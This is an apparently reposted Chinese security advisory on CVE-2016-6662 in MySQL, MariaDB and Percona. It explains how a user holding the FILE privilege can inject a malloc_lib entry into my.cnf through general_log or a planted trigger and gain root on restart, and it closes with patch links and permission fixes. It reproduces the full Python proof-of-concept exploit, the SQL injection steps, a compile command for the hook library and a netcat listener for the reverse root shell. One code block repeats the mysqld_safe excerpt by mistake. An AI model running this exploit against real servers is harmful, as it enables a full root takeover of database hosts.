> 原文链接: https://www.anquanke.com//post/id/84553 


# 【漏洞预警】Mysql代码执行漏洞，可本地提权（含exp，9/13 01点更新）


                                阅读量   
                                **436022**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                    



**[![](https://p5.ssl.qhimg.com/t0183a9fa2ea5486dfd.png)](https://p5.ssl.qhimg.com/t0183a9fa2ea5486dfd.png)**

**引用**

## 

【漏洞预警】Mysql代码执行漏洞，可本地提权（含exp，9/13 01点更新）

[http://bobao.360.cn/learning/detail/3025.html](http://bobao.360.cn/learning/detail/3025.html)

【技术分享】CVE-2016-6662-MySQL ‘malloc_lib’变量重写命令执行分析

[http://bobao.360.cn/learning/detail/3026.html](http://bobao.360.cn/learning/detail/3026.html)

**<br>**

**概要**

Mysql  (5.7, 5.6, 和 5.5版本)的所有默认安装配置，包括最新的版本，攻击者可以远程和本地利用该漏洞。该漏洞需要认证访问MYSQL数据库（通过网络连接或者像phpMyAdmin的web接口），以及通过SQL注入利用。**攻击者成功利用该漏洞可以以ROOT权限执行代码，完全控制服务器。**

**利用条件：首先你要有一个Mysql低权限用户，仅需有FIle权限（例如：虚拟主机通常会提供，因为需要导入导出文件），即可实现Root权限提升，进而控制服务器**

**<br>**

**漏洞影响**

MySQL  &lt;= 5.7.15       远程代码执行/ 提权 (0day)

       5.6.33

       5.5.52

Mysql分支的版本也受影响,包括：

MariaDB

PerconaDB 



**漏洞介绍**

这个漏洞影响(5.7, 5.6, 和 5.5版本)的所有Mysql默认配置，包括最新的版本，攻击者可以远程和本地利用该漏洞。该漏洞需要认证访问MYSQL数据库（通过网络连接或者像phpMyAdmin的web接口），以及通过SQL注入利用。攻击者成功利用该漏洞可以以ROOT权限执行代码，完全控制服务器。



**漏洞描述**

先看下我本地的MYSQL版本信息

```
root@debian:~# lsb_release -a
No LSB modules are available.
Distributor ID: Debian
Description:  Debian GNU/Linux 8.5 (jessie)
Release:  8.5
Codename: jessie
root@debian:~# dpkg -l | grep -i mysql-server
ii  mysql-server                        5.5.50-0+deb8u1
ii  mysql-server-5.5                    5.5.50-0+deb8u1
ii  mysql-server-core-5.5               5.5.50-0+deb8u1
```

之后启动Mysql服务器

```
root@debian:~# service mysql start
```

查看mysql的进程信息



```
root     14967  0.0  0.1   4340  1588 ?        S    06:41   0:00 /bin/sh /usr/bin/mysqld_safe
mysql    15314  1.2  4.7 558160 47736 ?        Sl   06:41   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
```

我们可以看到mysqld_safe的wrapper(封装)脚本是root权限执行的，而主要的mysqld进程确实mysql用户权限执行的。

我们看看该脚本



```
----[ /usr/bin/mysqld_safe ]----
[...]
# set_malloc_lib LIB
# - If LIB is empty, do nothing and return
# - If LIB is 'tcmalloc', look for tcmalloc shared library in /usr/lib
#   then pkglibdir.  tcmalloc is part of the Google perftools project.
# - If LIB is an absolute path, assume it is a malloc shared library
#
# Put LIB in mysqld_ld_preload, which will be added to LD_PRELOAD when
# running mysqld.  See ld.so for details.
set_malloc_lib() `{`
  malloc_lib="$1"
  if [ "$malloc_lib" = tcmalloc ]; then
    pkglibdir=`get_mysql_config --variable=pkglibdir`
    malloc_lib=
    # This list is kept intentionally simple.  Simply set --malloc-lib
    # to a full path if another location is desired.
    for libdir in /usr/lib "$pkglibdir" "$pkglibdir/mysql"; do
      for flavor in _minimal '' _and_profiler _debug; do
        tmp="$libdir/libtcmalloc$flavor.so"
        #log_notice "DEBUG: Checking for malloc lib '$tmp'"
        [ -r "$tmp" ] || continue
        malloc_lib="$tmp"
        break 2
      done
    done
[...]
----------[ eof ]---------------
```



通过手册我们可以得知–malloc-lib=LIB 选项可以加载一个so文件，如果攻击者可以注入路径信息到配置文件，就可以在MYSQL服务重启的时候，执行任意代码。

从2003开始，默认通过SELECT * INFO OUTFILE '/var/lib/mysql/my.cnf'是不能覆写文件的，但是我们可以利用mysql logging（MySQL ）功能绕过outfile/dumpfile重写文件的保护，攻击者需要 SELECT/FILE 权限 。

依赖于mysql的版本，相应的配置文件也不同



比如mysql5.5



```
/etc/my.cnf        Global options
/etc/mysql/my.cnfGlobal options
SYSCONFDIR/my.cnfGlobal options
$MYSQL_HOME/my.cnfServer-specific options
defaults-extra-fileThe file specified with --defaults-extra-file=file_name, if any
~/.my.cnfUser-specific options
```





我们通过覆写/etc/my.cnf注入malloc_lib=路径选项，命令如下：



```
----[ /usr/bin/mysqld_safe ]----
[...]
# set_malloc_lib LIB
# - If LIB is empty, do nothing and return
# - If LIB is 'tcmalloc', look for tcmalloc shared library in /usr/lib
#   then pkglibdir.  tcmalloc is part of the Google perftools project.
# - If LIB is an absolute path, assume it is a malloc shared library
#
# Put LIB in mysqld_ld_preload, which will be added to LD_PRELOAD when
# running mysqld.  See ld.so for details.
set_malloc_lib() `{`
  malloc_lib="$1"
  if [ "$malloc_lib" = tcmalloc ]; then
    pkglibdir=`get_mysql_config --variable=pkglibdir`
    malloc_lib=
    # This list is kept intentionally simple.  Simply set --malloc-lib
    # to a full path if another location is desired.
    for libdir in /usr/lib "$pkglibdir" "$pkglibdir/mysql"; do
      for flavor in _minimal '' _and_profiler _debug; do
        tmp="$libdir/libtcmalloc$flavor.so"
        #log_notice "DEBUG: Checking for malloc lib '$tmp'"
        [ -r "$tmp" ] || continue
        malloc_lib="$tmp"
        break 2
      done
    done
[...]
----------[ eof ]---------------
mysql&gt; set global general_log_file = '/etc/my.cnf';
mysql&gt; set global general_log = on;
mysql&gt; select '
    '&gt; 
    '&gt; ; injected config entry
    '&gt; 
    '&gt; [mysqld]
    '&gt; malloc_lib=/tmp/mysql_exploit_lib.so
    '&gt; 
    '&gt; [separator]
    '&gt; 
    '&gt; ';
mysql&gt; set global general_log = off;
```



**注意：修改配置文件后，会导致mysql重启的时候失败。**



注入后的my.cnf文件包含：



```
[mysqld]
malloc_lib=/tmp/mysql_exploit_lib.so
```



mysqld_safe也载入配置文件从mysql的data目录，(/var/lib/mysql/my.cnf)，这个功能从mysql 5.7移除，不再加载，所以即使mysql用户没有权限修改/etc/my.cnf，也可以通过下面的文件来加载



```
/var/lib/mysql/my.cnf 
/var/lib/mysql/.my.cnf
```



即使没有dba权限，也可以通过触发器来覆写文件



```
CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf
AFTER INSERT
   ON `active_table` FOR EACH ROW
BEGIN
   DECLARE void varchar(550);
   set global general_log_file='/var/lib/mysql/my.cnf';
   set global general_log = on;
   select "
[mysqld]
malloc_lib='/var/lib/mysql/mysql_hookandroot_lib.so'
" INTO void;   
   set global general_log = off;
END;
SELECT '....trigger_code...' INTO DUMPFILE /var/lib/mysql/activedb/active_table.TRG'
```



触发器写入成功后，刷新的时候会载入，比如通过执行一个insert语句来刷新

```
INSERT INTO `active_table` VALUES('xyz');
```





**POC**

****

```
----------[ 0ldSQL_MySQL_RCE_exploit.py ]--------------
#!/usr/bin/python
# This is a limited version of the PoC exploit. It only allows appending to
# existing mysql config files with weak permissions. See V) 1) section of 
# the advisory for details on this vector. 
#
# Full PoC will be released at a later date, and will show how attackers could
# exploit the vulnerability on default installations of MySQL on systems with no
# writable my.cnf config files available.
#
# The upcoming advisory CVE-2016-6663 will also make the exploitation trivial
# for certain low-privileged attackers that do not have FILE privilege.
# 
# See full advisory for details:
# http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.txt
#
# Stay tuned ;)
intro = """
0ldSQL_MySQL_RCE_exploit.py (ver. 1.0)
(CVE-2016-6662) MySQL Remote Root Code Execution / Privesc PoC Exploit
For testing purposes only. Do no harm.
Discovered/Coded by:
Dawid Golunski
http://legalhackers.com
"""
import argparse
import mysql.connector    
import binascii
import subprocess
def info(str):
    print "[+] " + str + "n"
def errmsg(str):
    print "[!] " + str + "n"
def shutdown(code):
    if (code==0):
        info("Exiting (code: %d)n" % code)
    else:
        errmsg("Exiting (code: %d)n" % code)
    exit(code)
cmd = "rm -f /var/lib/mysql/pocdb/poctable.TRG ; rm -f /var/lib/mysql/mysql_hookandroot_lib.so"
process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
(result, error) = process.communicate()
rc = process.wait() 
# where will the library to be preloaded reside? /tmp might get emptied on reboot
# /var/lib/mysql is safer option (and mysql can definitely write in there ;)
malloc_lib_path='/var/lib/mysql/mysql_hookandroot_lib.so'
# Main Meat
print intro
# Parse input args
parser = argparse.ArgumentParser(prog='0ldSQL_MySQL_RCE_exploit.py', description='PoC for MySQL Remote Root Code Execution / Privesc CVE-2016-6662')
parser.add_argument('-dbuser', dest='TARGET_USER', required=True, help='MySQL username') 
parser.add_argument('-dbpass', dest='TARGET_PASS', required=True, help='MySQL password')
parser.add_argument('-dbname', dest='TARGET_DB',   required=True, help='Remote MySQL database name')
parser.add_argument('-dbhost', dest='TARGET_HOST', required=True, help='Remote MySQL host')
parser.add_argument('-mycnf', dest='TARGET_MYCNF', required=True, help='Remote my.cnf owned by mysql user')
                  
args = parser.parse_args()
# Connect to database. Provide a user with CREATE TABLE, SELECT and FILE permissions
# CREATE requirement could be bypassed (malicious trigger could be attached to existing tables)
info("Connecting to target server %s and target mysql account '%s@%s' using DB '%s'" % (args.TARGET_HOST, args.TARGET_USER, args.TARGET_HOST, args.TARGET_DB))
try:
    dbconn = mysql.connector.connect(user=args.TARGET_USER, password=args.TARGET_PASS, database=args.TARGET_DB, host=args.TARGET_HOST)
except mysql.connector.Error as err:
    errmsg("Failed to connect to the target: `{``}`".format(err))
    shutdown(1)
try:
    cursor = dbconn.cursor()
    cursor.execute("SHOW GRANTS")
except mysql.connector.Error as err:
    errmsg("Something went wrong: `{``}`".format(err))
    shutdown(2)
privs = cursor.fetchall()
info("The account in use has the following grants/perms: " )
for priv in privs:
    print priv[0]
print ""
# Compile mysql_hookandroot_lib.so shared library that will eventually hook to the mysqld 
# process execution and run our code (Remote Root Shell)
# Remember to match the architecture of the target (not your machine!) otherwise the library
# will not load properly on the target.
info("Compiling mysql_hookandroot_lib.so")
cmd = "gcc -Wall -fPIC -shared -o mysql_hookandroot_lib.so mysql_hookandroot_lib.c -ldl"
process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
(result, error) = process.communicate()
rc = process.wait() 
if rc != 0:
    errmsg("Failed to compile mysql_hookandroot_lib.so: %s" % cmd)
    print error 
    shutdown(2)
# Load mysql_hookandroot_lib.so library and encode it into HEX
info("Converting mysql_hookandroot_lib.so into HEX")
hookandrootlib_path = './mysql_hookandroot_lib.so'
with open(hookandrootlib_path, 'rb') as f:
    content = f.read()
    hookandrootlib_hex = binascii.hexlify(content)
# Trigger payload that will elevate user privileges and sucessfully execute SET GLOBAL GENERAL_LOG 
# Decoded payload (paths may differ):
"""
DELIMITER //
CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf
AFTER INSERT
   ON `poctable` FOR EACH ROW
BEGIN
   DECLARE void varchar(550);
   set global general_log_file='/var/lib/mysql/my.cnf';
   set global general_log = on;
   select "
# 0ldSQL_MySQL_RCE_exploit got here :)
[mysqld]
malloc_lib='/var/lib/mysql/mysql_hookandroot_lib.so'
[abyss]
" INTO void;   
   set global general_log = off;
END; //
DELIMITER ;
"""
trigger_payload="""TYPE=TRIGGERS
triggers='CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf\nAFTER INSERT\n   ON `poctable` FOR EACH ROW\nBEGIN\n\n   DECLARE void varchar(550);\n   set global general_log_file=\'%s\';\n   set global general_log = on;\n   select "\n\n# 0ldSQL_MySQL_RCE_exploit got here :)\n\n[mysqld]\nmalloc_lib=\'%s\'\n\n[abyss]\n" INTO void;   \n   set global general_log = off;\n\nEND'
sql_modes=0
definers='root@localhost'
client_cs_names='utf8'
connection_cl_names='utf8_general_ci'
db_cl_names='latin1_swedish_ci'
""" % (args.TARGET_MYCNF, malloc_lib_path)
# Convert trigger into HEX to pass it to unhex() SQL function
trigger_payload_hex = "".join("`{`:02x`}`".format(ord(c)) for c in trigger_payload)
# Save trigger into a trigger file
TRG_path="/var/lib/mysql/%s/poctable.TRG" % args.TARGET_DB
info("Saving trigger payload into %s" % (TRG_path))
try:
    cursor = dbconn.cursor()
    cursor.execute("""SELECT unhex("%s") INTO DUMPFILE '%s' """ % (trigger_payload_hex, TRG_path) )
except mysql.connector.Error as err:
    errmsg("Something went wrong: `{``}`".format(err))
    shutdown(4)
# Save library into a trigger file
info("Dumping shared library into %s file on the target" % malloc_lib_path)
try:
    cursor = dbconn.cursor()
    cursor.execute("""SELECT unhex("%s") INTO DUMPFILE '%s' """ % (hookandrootlib_hex, malloc_lib_path) )
except mysql.connector.Error as err:
    errmsg("Something went wrong: `{``}`".format(err))
    shutdown(5)
# Creating table poctable so that /var/lib/mysql/pocdb/poctable.TRG trigger gets loaded by the server
info("Creating table 'poctable' so that injected 'poctable.TRG' trigger gets loaded")
try:
    cursor = dbconn.cursor()
    cursor.execute("CREATE TABLE `poctable` (line varchar(600)) ENGINE='MyISAM'"  )
except mysql.connector.Error as err:
    errmsg("Something went wrong: `{``}`".format(err))
    shutdown(6)
# Finally, execute the trigger's payload by inserting anything into `poctable`. 
# The payload will write to the mysql config file at this point.
info("Inserting data to `poctable` in order to execute the trigger and write data to the target mysql config %s" % args.TARGET_MYCNF )
try:
    cursor = dbconn.cursor()
    cursor.execute("INSERT INTO `poctable` VALUES('execute the trigger!');" )
except mysql.connector.Error as err:
    errmsg("Something went wrong: `{``}`".format(err))
    shutdown(6)
# Check on the config that was just created
info("Showing the contents of %s config to verify that our setting (malloc_lib) got injected" % args.TARGET_MYCNF )
try:
    cursor = dbconn.cursor()
    cursor.execute("SELECT load_file('%s')" % args.TARGET_MYCNF)
except mysql.connector.Error as err:
    errmsg("Something went wrong: `{``}`".format(err))
    shutdown(2)
finally:
    dbconn.close()  # Close DB connection
print ""
myconfig = cursor.fetchall()
print myconfig[0][0]
info("Looks messy? Have no fear, the preloaded lib mysql_hookandroot_lib.so will clean up all the mess before mysqld daemon even reads it :)")
# Spawn a Shell listener using netcat on 6033 (inverted 3306 mysql port so easy to remember ;)
info("Everything is set up and ready. Spawning netcat listener and waiting for MySQL daemon to get restarted to get our rootshell... :)" )
listener = subprocess.Popen(args=["/bin/nc", "-lvp","6033"])
listener.communicate()
print ""
# Show config again after all the action is done
info("Shell closed. Hope you had fun. ")
# Mission complete, but just for now... Stay tuned :)
info("""Stay tuned for the CVE-2016-6663 advisory and/or a complete PoC that can craft a new valid my.cnf (i.e no writable my.cnf required) ;)""")
# Shutdown
shutdown(0)
```

**对CVE-2016-6662的简单测试**

****

1.修改my.cnf的权限，让mysql用户可写

[![](https://p2.ssl.qhimg.com/t011a807601a6008521.png)](https://p2.ssl.qhimg.com/t011a807601a6008521.png)

2.通过mysql logging　覆写文件

[![](https://p5.ssl.qhimg.com/t01942310e775d27e49.png)](https://p5.ssl.qhimg.com/t01942310e775d27e49.png)

3.放置后门程序



```
gcc -Wall -fPIC -shared -o mysql_hookandroot_lib.c.so mysql_hookandroot_lib.c.c -ldl
```

[![](https://p3.ssl.qhimg.com/t01f00c2fbc5db7c587.png)](https://p3.ssl.qhimg.com/t01f00c2fbc5db7c587.png)

<br>

4.重启触发反弹

[![](https://p2.ssl.qhimg.com/t01107e946d18b09f1a.png)](https://p2.ssl.qhimg.com/t01107e946d18b09f1a.png)

**<br>**

**修复办法：**

**0day漏洞，目前尚无补丁，请持续关注安全客最新报道！**

**临时修复建议：不要给远程用户SUPER或者FILE权限 （2016/09/12 23:03 更新）**

**<br>**

**官方已经发布补丁：**（2016/09/13 18:03 更新）****

****

方便升级的用户尽快升级MySQL版本，升级后的MySQL将限制ld_preload仅仅能够从/usr/lib64,/usr/lib这种系统目录和MySQL安装目录载入 

补丁下载地址；

使用MySQL5.5版本的用户

[https://www.percona.com/downloads/Percona-Server-5.5/](https://www.percona.com/downloads/Percona-Server-5.5/)



使用MySQL 5.6版本的用户

[https://www.percona.com/downloads/Percona-Server-5.6/Percona-Server-5.6.32-78.0/](https://www.percona.com/downloads/Percona-Server-5.6/Percona-Server-5.6.32-78.0/)



使用MySQL5.7版本的用户

[https://www.percona.com/downloads/Percona-Server-5.7/Percona-Server-5.7.14-7/](https://www.percona.com/downloads/Percona-Server-5.7/Percona-Server-5.7.14-7/)



不方便升级的用户可以通过配置数据库用户权限和配置文件权限2方面修补：

数据库用户权限

不要给远程用户SUPER或者FILE权限，然而 CVE-2016-6663 提及到即使没有FILE权限，也可以利用（根据MySQL发行日志怀疑是和REPAIR TABLE使用临时文件有关）



配置文件权限

新建一个空的my.cnf和.my.cnf文件在datadir目录（通常是/var/lib/mysql目录，owner/group为root,权限为0600）

其他的位置/etc/my.cnf /etc/mysql/my.cnf /usr/etc/my.cnf ~/.my.cnf （可以通过mysqld –help –version来查看mysqld的版本信息）

确保配置文件中的!includedir定义中的目录mysql用户不可写

通过权限配置mysql用户不能够写配置文件



**原文参考：**

**[http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html](http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html)**

[https://www.percona.com/blog/2016/09/12/database-affected-cve-2016-6662/](https://www.percona.com/blog/2016/09/12/database-affected-cve-2016-6662/)





**引用**

## 

【漏洞预警】Mysql代码执行漏洞，可本地提权（含exp，9/13 01点更新）

[http://bobao.360.cn/learning/detail/3025.html](http://bobao.360.cn/learning/detail/3025.html)

【技术分享】CVE-2016-6662-MySQL ‘malloc_lib’变量重写命令执行分析

[http://bobao.360.cn/learning/detail/3026.html](http://bobao.360.cn/learning/detail/3026.html)

[](http://bobao.360.cn/learning/detail/3026.html)
